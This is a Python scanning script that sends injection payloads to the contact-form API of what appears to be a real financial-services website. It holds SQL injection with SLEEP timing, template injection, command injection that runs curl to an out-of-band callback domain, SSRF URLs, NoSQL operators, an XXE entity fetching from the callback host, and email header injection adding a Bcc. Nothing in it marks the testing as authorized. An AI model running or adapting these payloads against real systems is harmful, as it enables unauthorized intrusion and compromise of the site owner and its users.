import subprocess, json, time, urllib.parse
T="https://www.infinitycapital.bh"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
OOB="dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CMDI="oobabe03b861c1a."+OOB
SSRF="oob29958d17acdb."+OOB

def post(fields, ct="application/x-www-form-urlencoded"):
    if isinstance(fields,str):
        data=fields
    else:
        data=urllib.parse.urlencode(fields)
    cmd=["curl","-s","-A",UA,"-H","Content-Type: "+ct,"--data-binary",data,
         T+"/api/send","-o","/tmp/sp_%d"%int(time.time()*1000),"-D","/tmp/sph","-w","%{http_code}|%{time_total}"]
    r=subprocess.run(cmd,capture_output=True,text=True)
    h=open("/tmp/sph",errors="ignore").read()
    g=lambda k:[l.split(":",1)[1].strip() for l in h.split("\n") if l.lower().startswith(k)]
    import glob,os
    f=sorted(glob.glob("/tmp/sp_*"))[-1]
    b=open(f,"rb").read()
    return r.stdout.strip(), g("x-matched-path"), b[:260]

base={"to":"Contact","fname":"A","lname":"B","cname":"c","msg":"m","subject":"s","tel":"123","areacode":"1","check":"1"}
def mod(**kw):
    d=dict(base); d.update(kw); return d

cases={
 "sqli_time_msg":  mod(msg="x' AND SLEEP(6)-- -"),
 "sqli_time_cname":mod(cname="x' AND SLEEP(6)-- -"),
 "sqli_time_subject":mod(subject="x' AND SLEEP(6)-- -"),
 "sqli_time_fname":mod(fname="x' AND SLEEP(6)-- -"),
 "sqli_time_tel":  mod(tel="123' AND SLEEP(6)-- -"),
 "sqli_bool_msg":  mod(msg="x' AND '1'='1"),
 "ssti_msg":       mod(msg="{{7*7}} ${7*7}"),
 "ssti_cname":     mod(cname="{{7*7}}"),
 "ssti_subject":   mod(subject="{{config}}"),
 "cmdi_msg":       mod(msg="x;curl http://"+CMDI+"/cmdi;"),
 "cmdi_subject":   mod(subject="$(curl http://"+CMDI+"/cmdi2)"),
 "cmdi_cname":     mod(cname="x|curl http://"+CMDI+"/cmdi3"),
 "ssrf_url":       mod(url="http://"+SSRF+"/ssrf1"),
 "ssrf_image":     mod(image="http://"+SSRF+"/ssrf2"),
 "ssrf_attach":    mod(attachment="http://"+SSRF+"/ssrf3"),
 "ssrf_redirect":  mod(redirect="http://"+SSRF+"/ssrf4"),
 "ssrf_webhook":   mod(webhook="http://"+SSRF+"/ssrf5"),
 "nosqli_msg":     "to=Contact&msg=%24ne%3Dx&fname=A",
 "nosqli_cname":   "to=Contact&cname=%24gt%3D&fname=A",
 "xxe_body":       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://'+OOB+'/xxe_send">]><r>&x;</r>',
 "hdrinj_replyto": mod(reply_to="a@b.c\r\nBcc: victim@x.com"),
 "hdrinj_from":    mod(sender="a@b.c%0d%0aBcc: victim@x.com"),
}
for name,data in cases.items():
    ct="application/xml" if name=="xxe_body" else "application/x-www-form-urlencoded"
    try:
        st,xmp,b=post(data, ct)
    except Exception as e:
        st,xmp,b="ERR","",str(e)
    print(f"--- {name:<18} {st} xmp={xmp}")
    print("    body:", b[:200])
    time.sleep(0.3)
